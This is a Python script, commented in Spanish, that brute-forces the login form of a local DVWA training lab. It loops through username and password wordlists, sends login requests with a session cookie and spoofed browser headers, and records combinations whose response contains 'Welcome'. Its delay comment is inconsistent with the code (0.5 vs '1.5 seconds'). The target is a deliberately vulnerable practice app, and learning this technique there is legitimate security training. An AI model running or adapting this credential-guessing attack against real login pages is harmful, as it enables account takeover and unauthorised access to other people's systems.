import requests
import time

# URL del formulario de login en DVWA
url = "http://127.0.0.1:8081/vulnerabilities/brute/"

# Configuración de cookies para mantener la sesión activa
cookies = {
    "PHPSESSID": "4b7b63786ca16c133e776bb495c6c0a7",  # Reemplazar con el valor actual de la sesión
    "security": "low"
}

# Cabeceras HTTP necesarias
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://127.0.0.1:8081/vulnerabilities/brute/",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1"
}

# Cargar usuarios y contraseñas desde archivos
usuarios = open("username.txt").read().splitlines()
contrasenas = open("password.txt").read().splitlines()

credenciales_validas = []

# Ataque de fuerza bruta
for usuario in usuarios:
    for password in contrasenas:
        datos = {
            "username": usuario,
            "password": password,
            "Login": "Login"
        }

        # Realizar solicitud GET
        respuesta = requests.get(url, params=datos, cookies=cookies, headers=headers)

        # Mostrar el intento en consola
        print(f"Probando → Usuario: {usuario} | Contraseña: {password}")

        # Validar si el intento fue exitoso
        if "Welcome" in respuesta.text:
            print(f"[✔] Credenciales encontradas: Usuario: {usuario} | Contraseña: {password}")
            credenciales_validas.append((usuario, password))
            break  # Detener prueba con este usuario y pasar al siguiente

        # Introducir un delay para evitar bloqueos o respuestas falsas
        time.sleep(0.5)  # Espera de 1.5 segundos entre intentos

# Mostrar resultados finales
print("\n========== RESULTADOS ==========")
if credenciales_validas:
    print("Credenciales válidas encontradas:")
    for usuario, password in credenciales_validas:
        print(f"✔ {usuario}:{password}")
else:
    print("No se encontraron credenciales válidas.")